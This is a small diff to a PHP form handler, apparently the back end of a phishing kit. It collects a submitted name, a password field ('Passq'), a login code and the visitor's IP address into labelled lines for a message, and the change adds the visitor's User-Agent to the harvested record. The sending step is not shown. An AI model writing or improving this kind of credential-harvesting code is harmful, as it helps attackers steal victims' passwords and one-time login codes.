@@ -15,6 +15,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   $login_code = isset($_POST['login_code']) ? htmlspecialchars($_POST['login_code']) : '';
   $ip = $_SERVER['REMOTE_ADDR'];
 
+    // Get User-Agent from HTTP headers
+    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
   // Create an array of data
   $data = array(
     '🌐 Name: ' => $name,
@@ -24,6 +27,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     '🌐 Passq: ' => $guxhatok,
     '🌐 login_code: ' => $login_code,
     '🌐 Biras: ' => $ip,
+    '🌐 User-Agent: ' => $userAgent,
   );
 
   // Initialize the message text
